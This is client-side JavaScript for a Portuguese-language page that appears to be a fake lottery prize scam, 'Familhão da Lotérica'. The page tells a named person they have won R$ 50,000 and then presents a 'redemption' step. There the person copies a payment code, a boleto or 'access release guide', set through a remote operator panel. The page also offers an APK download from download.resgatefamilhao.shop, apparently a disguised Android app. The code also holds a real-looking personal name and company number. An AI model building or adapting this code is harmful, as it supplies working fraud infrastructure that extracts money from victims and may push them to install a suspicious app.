const WORKER_BASE='https://download.resgatefamilhao.shop';
const API_URL=WORKER_BASE+'/config';
const APK_STATUS_URL=WORKER_BASE+'/apk/status';
const STORAGE_KEY='campanha-premiada-settings';

const defaults={
  customerName:'VERA LÚCIA APARECIDA GNANI',
  campaignName:'Familhão da Lotérica',
  message:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
  prizeValue:'R$ 50.000,00',
  paymentMethod:'acesso',
  paymentCode:'',
  redemptionText:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
  companyName:'Empresa responsável',
  cnpj:'49.520.113/0001-07',
  regulationUrl:'#',
  termsUrl:'#'
};

let settings={...defaults};

function setText(id,value){
  const el=document.getElementById(id);
  if(el) el.textContent=value||'';
}

function render(){
  const s=settings;
  setText('customerName',(s.customerName||defaults.customerName).toUpperCase());
  setText('campaignName',s.campaignName||defaults.campaignName);
  setText('message',s.message||defaults.message);
  setText('prizeValue',s.prizeValue||defaults.prizeValue);
  setText('redeemCustomerName',(s.customerName||defaults.customerName).toUpperCase());
  setText('redeemCampaignName',s.campaignName||defaults.campaignName);
  setText('redeemText',s.redemptionText||s.message||defaults.redemptionText);
  setText('redeemPrizeValue',s.prizeValue||defaults.prizeValue);
  setText('paymentMethodLabel',s.paymentMethod==='boleto'?'Boleto':'Guia de liberação de acesso');
  setText('paymentCodeDisplay',s.paymentCode||'Código não configurado');
  setText('companyName',s.companyName||defaults.companyName);
  setText('cnpj',s.cnpj||defaults.cnpj);

  const regulation=document.getElementById('regulationLink');
  if(regulation) regulation.href=s.regulationUrl||'#';
  const terms=document.getElementById('termsLink');
  if(terms) terms.href=s.termsUrl||'#';
}

async function loadGlobalConfig(){
  try{
    const response=await fetch(API_URL+'?t='+Date.now(),{
      method:'GET',
      cache:'no-store',
      headers:{'Accept':'application/json'}
    });
    if(!response.ok) throw new Error('HTTP '+response.status);
    const remote=await response.json();
    settings={...defaults,...remote};
    try{localStorage.setItem(STORAGE_KEY,JSON.stringify(settings))}catch{}
  }catch(error){
    console.error('Falha ao carregar configuração global:',error);
    try{
      settings={...defaults,...JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}')};
    }catch{
      settings={...defaults};
    }
  }
  render();
}

function showRedemption(){
  document.getElementById('winnerView').hidden=true;
  document.getElementById('redemptionView').hidden=false;
  render();
  window.scrollTo({top:0,behavior:'smooth'});
}

function showWinner(){
  document.getElementById('redemptionView').hidden=true;
  document.getElementById('winnerView').hidden=false;
  render();
  window.scrollTo({top:0,behavior:'smooth'});
}

async function copyCode(){
  const code=(settings.paymentCode||'').trim();
  const feedback=document.getElementById('copyFeedback');
  if(!code){
    feedback.textContent='Nenhuma guia foi configurada no painel.';
    return;
  }
  try{
    await navigator.clipboard.writeText(code);
  }catch{
    const ta=document.createElement('textarea');
    ta.value=code;
    ta.style.position='fixed';
    ta.style.opacity='0';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    ta.remove();
  }
  feedback.textContent='Guia copiada.';
  setTimeout(()=>feedback.textContent='',1800);
}

function launchConfetti(){
  const layer=document.getElementById('confettiLayer');
  if(!layer) return;
  const motion=window.matchMedia('(prefers-reduced-motion: reduce)');
  if(motion.matches){layer.remove();return}
  const colors=['#c61fb0','#7a2cff','#ff8a4c','#ffcf3f','#1ec8a5'];
  const fragment=document.createDocumentFragment();

  for(let i=0;i<120;i++){
    const piece=document.createElement('i');
    piece.className='confetti-piece';
    piece.style.left=(Math.random()*100)+'%';
    piece.style.setProperty('--c',colors[Math.floor(Math.random()*colors.length)]);
    piece.style.setProperty('--r',(Math.random()*360)+'deg');
    piece.style.setProperty('--spin',(540+Math.random()*540)+'deg');
    piece.style.setProperty('--drift',((Math.random()*220)-110)+'px');
    piece.style.animationDelay=(Math.random()*.3)+'s';
    piece.style.animationDuration=(4+Math.random()*.7)+'s';
    piece.style.width=(6+Math.random()*8)+'px';
    piece.style.height=(10+Math.random()*12)+'px';
    fragment.appendChild(piece);
  }

  layer.appendChild(fragment);
  setTimeout(()=>layer.remove(),5100);
}

document.getElementById('ctaButton')?.addEventListener('click',showRedemption);
document.getElementById('backButton')?.addEventListener('click',showWinner);
document.getElementById('copyPaymentCode')?.addEventListener('click',copyCode);

async function updateApkDownload(){
  const button=document.getElementById('apkDownloadButton');
  if(!button) return;

  try{
    const response=await fetch(APK_STATUS_URL+'?t='+Date.now(),{cache:'no-store'});
    if(!response.ok) throw new Error('HTTP '+response.status);
    const data=await response.json();

    if(data.exists){
      button.classList.remove('is-disabled');
      button.removeAttribute('aria-disabled');
      button.textContent='Baixar aplicativo Familhão Resgate';
      button.href=WORKER_BASE+'/apk';
    }else{
      button.classList.add('is-disabled');
      button.setAttribute('aria-disabled','true');
      button.removeAttribute('href');
      button.textContent='Aplicativo temporariamente indisponível';
    }
  }catch(error){
    console.error('Falha ao verificar APK:',error);
  }
}

render();
launchConfetti();
loadGlobalConfig();
updateApkDownload();

window.addEventListener('focus',loadGlobalConfig);
document.addEventListener('visibilitychange',()=>{
  if(document.visibilityState==='visible'){ loadGlobalConfig(); updateApkDownload(); }
});
